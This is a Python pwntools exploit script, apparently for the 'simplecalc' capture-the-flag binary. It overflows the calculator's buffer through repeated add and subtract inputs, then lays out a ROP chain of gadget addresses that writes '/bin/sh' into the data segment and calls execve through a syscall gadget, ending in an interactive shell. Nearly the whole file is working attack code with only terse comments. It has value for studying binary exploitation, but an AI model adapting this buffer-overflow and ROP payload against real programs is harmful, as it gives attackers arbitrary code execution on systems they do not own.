#!/usr/bin/env python3
from pwn import *

# ROP gadgets
pop_rax = 0x44db34        # pop rax; ret
pop_rsi = 0x401c87        # pop rsi; ret
pop_rdi = 0x401b73        # pop rdi; ret
pop_rdx = 0x437a85        # pop rdx; ret
syscall_gadget = 0x400488 # syscall
mov_gadget = 0x44526e     # mov qword ptr [rax], rdx ; ret

data_region_addr = 0x6c1060 

target = process("./simplecalc")
target.recvuntil(b"Expected number of calculations: ")
target.send(b"255\n")

def send_add(x):
    print(target.recvuntil(b"=> "))
    target.send(b"1\n")
    print(target.recvuntil(b"Integer x: "))
    target.send(b"40\n")
    print(target.recvuntil(b"Integer y: "))
    target.send(bytes(str(x - 40), encoding="ASCII"))
    target.send(b"\n")

def send_sub(x):
    print(target.recvuntil(b"=> "))
    target.send(b"2\n")
    print(target.recvuntil(b"Integer x: "))
    target.send(b"999999\n")
    print(target.recvuntil(b"Integer y: "))
    target.send(bytes(str(999999 - x), encoding="ASCII"))
    target.send(b"\n")

def send_addr(rop, func):
    func(rop)
    func(0)

for _ in range(18):   # 0x48 = 18 * 4
    send_add(0) # fill up the buffer with 0

send_addr(pop_rax, send_add)
send_addr(data_region_addr, send_add) # data seg address we will write /bin/sh to

send_addr(pop_rdx, send_add)
send_add(0x6e69622f)  # nib/    (/bin little endian in hex)
send_add(0x0068732f)  # 0hs/    (/sh0 little endian in hex)

send_addr(mov_gadget, send_add)

send_addr(pop_rax, send_add)
send_addr(0x3b, send_sub) # syscall no for execve 64-bit
# use sub to avoid program exit from small numbers

send_addr(pop_rdi, send_add)
send_addr(data_region_addr, send_add) # pointer to filename to execute (/bin/sh)

send_addr(pop_rsi, send_add) # argv
send_addr(0, send_add)

send_addr(pop_rdx, send_add) # envp
send_addr(0, send_add)

send_addr(syscall_gadget, send_add)

# terminate calculator
#gdb.attach(target)
target.send(b"5\n")

target.interactive()
